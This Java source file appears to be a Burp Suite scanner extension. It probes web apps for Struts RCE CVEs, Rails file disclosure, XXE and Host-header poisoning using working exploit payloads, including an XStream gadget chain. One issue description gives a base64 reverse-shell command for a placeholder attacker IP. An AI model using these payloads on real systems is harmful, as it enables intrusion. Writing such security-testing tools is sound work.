package burp;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import org.apache.commons.lang3.tuple.ImmutablePair;
import org.apache.commons.lang3.tuple.Pair;
import org.apache.commons.lang3.text.StrSubstitutor;

import java.util.*;
import java.net.URL;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PerRequestScans extends ParamScan {
    private final List<ScanCheck> scanChecks;

    public PerRequestScans(String name) {
        super(name);
        scanChecks = Arrays.asList(
                this::doHostHeaderScan,
                this::doCodePathScan,
                this::doStrutsScan,
                this::doStruts20179805Scan,
                this::doStruts201811776Scan,
                this::doXXEPostScan,
                this::doRailsScan
        );
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse basePair) {
        return Collections.emptyList();
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse basePair, IScannerInsertionPoint insertionPoint) {
        if (!shouldTriggerPerRequestAttacks(basePair, insertionPoint)) {
            return Collections.emptyList();
        }

        List<IScanIssue> issues = new ArrayList<>();
        for (ScanCheck scanCheck : scanChecks) {
            try {
                issues.addAll(scanCheck.perform(basePair));
            } catch (Exception e) {
                System.err.println("Error executing PerRequestScans." + scanCheck.getClass().getName() + ": ");
                e.printStackTrace();
            }
        }
        return issues;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue iScanIssue, IScanIssue iScanIssue1) {
        return 0;
    }

    private boolean shouldTriggerPerRequestAttacks(IHttpRequestResponse basePair, IScannerInsertionPoint insertionPoint) {
        IRequestInfo request = Utilities.helpers.analyzeRequest(basePair.getRequest());
        List<IParameter> params = request.getParameters();

        if (!params.isEmpty()) {
            int firstParameterOffset = Integer.MAX_VALUE;
            IParameter firstParameter = null;
            for (int paramType : Arrays.asList(
                    IParameter.PARAM_BODY, IParameter.PARAM_URL, IParameter.PARAM_JSON,
                    IParameter.PARAM_XML, IParameter.PARAM_XML_ATTR, IParameter.PARAM_MULTIPART_ATTR, IParameter.PARAM_COOKIE)) {
                for (IParameter param : params) {
                    if (param.getType() != paramType) {
                        continue;
                    }
                    if (param.getNameStart() < firstParameterOffset) {
                        firstParameterOffset = param.getNameStart();
                        firstParameter = param;
                    }
                }
                if (firstParameter != null) {
                    break;
                }
            }

            if (firstParameter != null && firstParameter.getName().equals(insertionPoint.getInsertionPointName())) {
                return true;
            }
        } else if (insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_HEADER && "User-Agent".equals(insertionPoint.getInsertionPointName())) {
            return true;
        }

        return false;
    }

    private List<IScanIssue> doRailsScan(IHttpRequestResponse basePair) {
        if (OldUtilities.safeBytesToString(basePair.getResponse()).contains("127.0.0.1")) {
            return Collections.emptyList();
        }

        IHttpRequestResponse attack = fetchModifiedRequest(basePair, "Accept", "../../../../../../../../../../../e*c/h*s*s{{");
        String response = OldUtilities.safeBytesToString(attack.getResponse());
        if (response.contains("127.0.0.1")) {
            try {
                String collabLocation = Utilities.callbacks.createBurpCollaboratorClientContext().getCollaboratorServerLocation();
                if (response.contains(collabLocation)) {
                    return Collections.emptyList();
                }
            } catch (Exception e) {
                // Ignore exceptions
            }
            return Collections.singletonList(new CustomScanIssue(
                    basePair.getHttpService(), Utilities.helpers.analyzeRequest(basePair).getUrl(),
                    new IHttpRequestResponse[]{attack},
                    "Rails file disclosure",
                    "The application appears to be vulnerable to CVE-2019-5418, enabling arbitrary file disclosure.",
                    "Firm", CustomScanIssue.severity.High
            ));
        }
        return Collections.emptyList();
    }

    private List<IScanIssue> doStrutsScan(IHttpRequestResponse basePair) {
        Random random = new Random();
        int x = random.nextInt(9000) + 1000;
        int y = random.nextInt(9000) + 1000;
        IHttpRequestResponse attack = fetchModifiedRequest(basePair, "Content-Type", "${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"X-Ack\"," + x + "*" + y + ")}.multipart/form-data");

        String responseHeaders = String.join("\n", Utilities.helpers.analyzeResponse(attack.getResponse()).getHeaders());
        if (responseHeaders.contains(String.valueOf(x * y))) {
            return Collections.singletonList(new CustomScanIssue(
                    basePair.getHttpService(), Utilities.helpers.analyzeRequest(basePair).getUrl(),
                    new IHttpRequestResponse[]{attack},
                    "Struts2 RCE",
                    "The application appears to be vulnerable to CVE-2017-5638, enabling arbitrary code execution.",
                    "Firm", CustomScanIssue.severity.High
            ));
        }

        return Collections.emptyList();
    }

    private IHttpRequestResponse fetchModifiedRequest(IHttpRequestResponse basePair, String headerName, String headerValue) {
        IRequestInfo requestInfo = Utilities.helpers.analyzeRequest(basePair.getRequest());
        byte[] newReq =  Utilities.addOrReplaceHeader(basePair.getRequest(), headerName, headerValue);
        // String newReq = OldUtilities.safeBytesToString(basePair.getRequest()).replaceFirst(requestInfo.getHeaders().get(0), headerName + ": " + headerValue);
        return Utilities.callbacks.makeHttpRequest(basePair.getHttpService(), newReq);
    }

    private interface ScanCheck {
        List<IScanIssue> perform(IHttpRequestResponse basePair);
    }

    private List<IScanIssue> doStruts20179805Scan(IHttpRequestResponse basePair) {
        if (Utilities.callbacks.saveConfigAsJson("project_options.misc.collaborator_server").contains("\"type\":\"none\"")) {
            return Collections.emptyList();
        }

        IBurpCollaboratorClientContext collab = Utilities.callbacks.createBurpCollaboratorClientContext();
        String collabPayload = collab.generatePayload(true);

        String paramPre = "<?xml version=\"1.0\" encoding=\"utf8\"?><map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"><dataHandler><dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"><is class=\"javax.crypto.CipherInputStream\"><cipher class=\"javax.crypto.NullCipher\"><initialized>false</initialized><opmode>0</opmode><serviceIterator class=\"javax.imageio.spi.FilterIterator\"><iter class=\"javax.imageio.spi.FilterIterator\"><iter class=\"java.util.Collections$EmptyIterator\"/><next class=\"java.lang.ProcessBuilder\"><command><string>";
        String paramPost = "</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class=\"javax.imageio.ImageIO$ContainsFilter\"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class=\"string\">foo</next></serviceIterator><lock/></cipher><input class=\"java.lang.ProcessBuilder$NullInputStream\"/><ibuffer/><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/><jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/></entry></map>";

        String command = "ping</string><string>" + collabPayload + "</string><string>-c1";
        String wholeParam = paramPre + command + paramPost;

        IHttpRequestResponse attack = fetchModifiedRequest(basePair, "Content-Type", "application/xml");
        attack = fetchModifiedRequest(attack, "Content-Length", String.valueOf(wholeParam.length()));

        byte[] req = attack.getRequest();
        String asciiReq = new String(req);

        int bodyIndex = asciiReq.indexOf("\r\n\r\n");
        if (bodyIndex > 1) {
            req = Arrays.copyOfRange(req, 0, bodyIndex + 4);
        } else {
            bodyIndex = asciiReq.indexOf("\n\n");
            if (bodyIndex > 1) {
                req = Arrays.copyOfRange(req, 0, bodyIndex + 2);
            }
        }

        req = OldUtilities.concatenate(req, wholeParam.getBytes());

        if (req[0] == 71) { // if request starts with G (GET)
            req = Arrays.copyOfRange(req, 3, req.length); // trim GET
            req = OldUtilities.concatenate(new byte[]{80, 79, 83, 84}, req); // insert POST
        }

        System.out.println("The outgoing Struts_2017_9805 request looks like:\n\n" + new String(req) + "\n");

        attack = Utilities.callbacks.makeHttpRequest(basePair.getHttpService(), req);
        List<IBurpCollaboratorInteraction> interactions = collab.fetchAllCollaboratorInteractions();

        if (!interactions.isEmpty()) {
            return Collections.singletonList(new CustomScanIssue(
                    basePair.getHttpService(), Utilities.helpers.analyzeRequest(basePair).getUrl(),
                    new IHttpRequestResponse[]{attack},
                    "Struts2 CVE-2017-9805 RCE",
                    "The application appears to be vulnerable to CVE-2017-9805, enabling arbitrary code execution. For POC or reverse shell, write a command, put it in Base64 (to keep special chars from breaking XML), and change the nslookup chunk to something like:\n\n'/bin/bash</string><string>-c</string><string>echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tfaXAvYXR0YWNrX3BvcnQgMD4mMQ== | base64 -d | tee -a /tmp/.deleteme.tmp ; /bin/bash /tmp/.deleteme.tmp ; /bin/rm /tmp/.deleteme.tmp'",
                    "Firm", CustomScanIssue.severity.High
            ));
        }

        return Collections.emptyList();
    }

        private List<IScanIssue> doStruts201811776Scan(IHttpRequestResponse basePair) {
            String origResponse = OldUtilities.safeBytesToString(basePair.getResponse());
            if (!origResponse.contains("302 Found")) {
                return Collections.emptyList();
            }

            String path = Utilities.helpers.analyzeRequest(basePair).getUrl().getPath();
            int lastSlash = path.lastIndexOf('/');

            Random random = new Random();
            int x = random.nextInt(9000) + 1000;
            int y = random.nextInt(9000) + 1000;
            String attackString = "/$%7B(" + x + "*" + y + ")%7D";
            String attackPath = path.substring(0, lastSlash) + attackString + path.substring(lastSlash);

            String newReq = OldUtilities.safeBytesToString(basePair.getRequest()).replaceFirst(path, attackPath);
            System.out.println("The outgoing 2018-11776 request looks like:\n\n" + newReq + "\n");
            IHttpRequestResponse attack = Utilities.callbacks.makeHttpRequest(basePair.getHttpService(), newReq.getBytes());
            String asciiResponse = new String(attack.getResponse());

            if (asciiResponse.contains(String.valueOf(x * y))) {
                int requestMarkerStart = newReq.indexOf(x + "*" + y);
                int requestMarkerEnd = requestMarkerStart + (x + "*" + y).length();
                int responseMarkerStart = asciiResponse.indexOf(String.valueOf(x * y));
                int responseMarkerEnd = responseMarkerStart + String.valueOf(x * y).length();

                List<int[]> requestMarkers = Collections.singletonList(new int[]{requestMarkerStart, requestMarkerEnd});
                List<int[]> responseMarkers = Collections.singletonList(new int[]{responseMarkerStart, responseMarkerEnd});

                IHttpRequestResponse markedAttack = Utilities.callbacks.applyMarkers(attack, requestMarkers, responseMarkers);
                return Collections.singletonList(new CustomScanIssue(
                        basePair.getHttpService(), Utilities.helpers.analyzeRequest(basePair).getUrl(),
                        new IHttpRequestResponse[]{markedAttack},
                        "Struts2 CVE-2018-11776 RCE",
                        "The application appears to be vulnerable to CVE-2018-11776, enabling arbitrary code execution.",
                        "Firm", CustomScanIssue.severity.High
                ));
            }

            return Collections.emptyList();
        }

    private List<IScanIssue> doXXEPostScan(IHttpRequestResponse basePair) {
        if (Utilities.callbacks.saveConfigAsJson("project_options.misc.collaborator_server").contains("\"type\":\"none\"")) {
            return Collections.emptyList();
        }

        IBurpCollaboratorClientContext collab = Utilities.callbacks.createBurpCollaboratorClientContext();
        String collabPayload = collab.generatePayload(true);

        String xxePayload = "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE data SYSTEM \"http://" + collabPayload + "/scanner.dtd\"><data>&all;</data>";

        byte[] req = OldUtilities.setHeader(basePair.getRequest(), "Content-Type", "text/xml", true);
        req = OldUtilities.setHeader(req, "Content-Length", String.valueOf(xxePayload.length()), true);

        String asciiReq = new String(req);

        int bodyIndex = asciiReq.indexOf("\r\n\r\n");
        if (bodyIndex > 1) {
            req = Arrays.copyOfRange(req, 0, bodyIndex + 4);
        } else {
            bodyIndex = asciiReq.indexOf("\n\n");
            if (bodyIndex > 1) {
                req = Arrays.copyOfRange(req, 0, bodyIndex + 2);
            }
        }

        req = OldUtilities.concatenate(req, xxePayload.getBytes());

        if (req[0] == 71) { // if request starts with G (GET)
            req = Arrays.copyOfRange(req, 3, req.length); // trim GET
            req = OldUtilities.concatenate(new byte[]{80, 79, 83, 84}, req); // insert POST
        }

        System.out.println("The outgoing XXEPostScan request looks like:\n\n" + new String(req) + "\n");

        IHttpRequestResponse attack = Utilities.callbacks.makeHttpRequest(basePair.getHttpService(), req);
        List<IBurpCollaboratorInteraction> interactions = collab.fetchAllCollaboratorInteractions();

        if (!interactions.isEmpty()) {
            return Collections.singletonList(new CustomScanIssue(
                    basePair.getHttpService(), Utilities.helpers.analyzeRequest(basePair).getUrl(),
                    new IHttpRequestResponse[]{attack},
                    "XXE via POST Request",
                    "The application appears to be vulnerable to standard XML eXternal Entity (XXE) via a crafted POST request.  Check the following URL for various method/payload choices:  https://web-in-security.blogspot.it/2016/03/xxe-cheat-sheet.html",
                    "Firm", CustomScanIssue.severity.High
            ));
        }

        return Collections.emptyList();
    }

    private List<IScanIssue> doCodePathScan(IHttpRequestResponse basePair) {
        String baseRespString = OldUtilities.safeBytesToString(basePair.getResponse());
        String baseRespPrint = OldUtilities.tagmap(baseRespString);
        Pair<String, IHttpRequestResponse> xmlResult = codepathAttack(basePair, "application/xml");
        if (!xmlResult.getKey().equals("-1")) {
            if (!xmlResult.getKey().equals(baseRespPrint)) {
                Pair<String, IHttpRequestResponse> zmlResult = codepathAttack(basePair, "application/zml");
                assert !zmlResult.getKey().equals("-1");
                if (!zmlResult.getKey().equals(xmlResult.getKey())) {
                    OldUtilities.launchPassiveScan(xmlResult.getValue());
                    return Collections.singletonList(new CustomScanIssue(
                            basePair.getHttpService(), Utilities.helpers.analyzeRequest(basePair).getUrl(),
                            new IHttpRequestResponse[]{basePair, xmlResult.getValue(), zmlResult.getValue()},
                            "XML input supported",
                            "The application appears to handle application/xml input. Consider investigating whether it's vulnerable to typical XML parsing attacks such as XXE.",
                            "Tentative", CustomScanIssue.severity.Information
                    ));
                }
            }
        }

        return Collections.emptyList();
    }

    private Pair<String, IHttpRequestResponse> codepathAttack(IHttpRequestResponse basePair, String contentType) {
        byte[] attack = OldUtilities.setHeader(basePair.getRequest(), "Content-Type", contentType, true);
        if (attack == null) {
            return new ImmutablePair<>("-1", null);
        }

        IHttpRequestResponse result = Utilities.callbacks.makeHttpRequest(basePair.getHttpService(), attack);
        byte[] resp = result.getResponse();
        if (resp == null) {
            resp = new byte[0];
        }
        return new ImmutablePair<>(OldUtilities.tagmap(OldUtilities.safeBytesToString(resp)), result);
    }


    private IScanIssue _raise(IHttpRequestResponse basePair, IHttpRequestResponse attack, String type) {
        IHttpService service = attack.getHttpService();
        URL url = Utilities.helpers.analyzeRequest(attack).getUrl();

        String title;
        CustomScanIssue.severity severity;
        String confidence;
        String description;

        if (type.equals("dns")) {
            title = "Arbitrary host header accepted";
            severity = CustomScanIssue.severity.Low;
            confidence = "Certain";
            description = """
                The application appears to be accessible using arbitrary HTTP Host headers. <br/><br/>

                This is a serious issue if the application is not externally accessible or uses IP-based access restrictions. Attackers can use DNS Rebinding to bypass any IP or firewall based access restrictions that may be in place, by proxying through their target's browser.<br/>
                Note that modern web browsers' use of DNS pinning does not effectively prevent this attack. The only effective mitigation is server-side: https://bugzilla.mozilla.org/show_bug.cgi?id=689835#c13<br/><br/>

                Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'.
                
                Resources: <br/><ul>
                    <li>https://portswigger.net/web-security/host-header</li>
                </ul>
                """;
        } else {
            title = "Host header poisoning";
            severity = CustomScanIssue.severity.Medium;
            confidence = "Tentative";
            description = """
            The application appears to trust the user-supplied host header. By supplying a malicious host header with a password reset request, it may be possible to generate a poisoned password reset link. Consider testing the host header for classic server-side injection vulnerabilities.<br/>
                <br/>
                    Depending on the configuration of the server and any intervening caching devices, it may also be possible to use this for cache poisoning attacks.<br/>
                <br/>
                    Resources: <br/><ul>
                    <li>https://portswigger.net/web-security/host-header<br/></li>
                    <li>http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</li>
                </ul>
                    """;
        }

        return new CustomScanIssue(service, url, new IHttpRequestResponse[] { basePair, attack }, title, description, confidence, severity);
    }

    List<IScanIssue> doHostHeaderScan(IHttpRequestResponse baseRequestResponse) {
        HttpRequest original = Utilities.buildMontoyaReq(Utilities.convertToHttp1(baseRequestResponse.getRequest()), baseRequestResponse.getHttpService());
        String realHost = original.headerValue("Host");

        byte[] baseResponse = baseRequestResponse.getResponse();

        if (baseResponse == null) {
            baseResponse = Scan.request(original, true).request().toByteArray().getBytes();
        }

        if (!Utilities.containsBytes(baseResponse, realHost.getBytes())) {
            return Collections.emptyList();
        }

        List<IScanIssue> issues = new ArrayList<>();

        short expectedStatus = Utilities.getCode(baseResponse);
        String refererCanary = Utilities.randomString(6);
        String hostCanary = Utilities.randomString(6);
        String payloadHost = hostCanary + realHost;

        HttpRequest attackBase = original.withHeader("Referer", "https://"+payloadHost+"/"+refererCanary).withHeader("Cache-Control", "no-cache").withParameter(HttpParameter.parameter("cachebust", Utilities.randomString(6), HttpParameterType.URL));
        MontoyaRequestResponse basicHostAttack = Scan.request(attackBase.withHeader("Host", payloadHost), true);;
        if (basicHostAttack.status() == expectedStatus) {
            // DNS rebinding doesn't work on HTTPS
            if (!basicHostAttack.httpService().secure()) {
                issues.add(_raise(baseRequestResponse, new Resp(basicHostAttack), "dns"));
            }

            if (basicHostAttack.response().contains(hostCanary, false) && !basicHostAttack.response().contains(refererCanary, false)) {
                issues.add(_raise(baseRequestResponse, new Resp(basicHostAttack), "host"));
                return issues;
            }
        }

        MontoyaRequestResponse absHostAttack = Scan.request(attackBase.withHeader("Host", payloadHost).withPath("https://" + realHost + attackBase.path()), true);;
        if (absHostAttack.status() == expectedStatus && absHostAttack.response().contains(hostCanary, false) && !absHostAttack.response().contains(refererCanary, false)) {
            issues.add(_raise(baseRequestResponse, new Resp(absHostAttack), "abs"));
            return issues;
        }

        MontoyaRequestResponse xfHostAttack = Scan.request(attackBase.withHeader("X-Forwarded-Host", payloadHost), true);
        if (xfHostAttack.status() == expectedStatus && xfHostAttack.response().contains(hostCanary, false) && !xfHostAttack.response().contains(refererCanary, false))  {
            issues.add(_raise(baseRequestResponse, new Resp(xfHostAttack), "xfh"));
            return issues;
        }


        return issues;
    }
}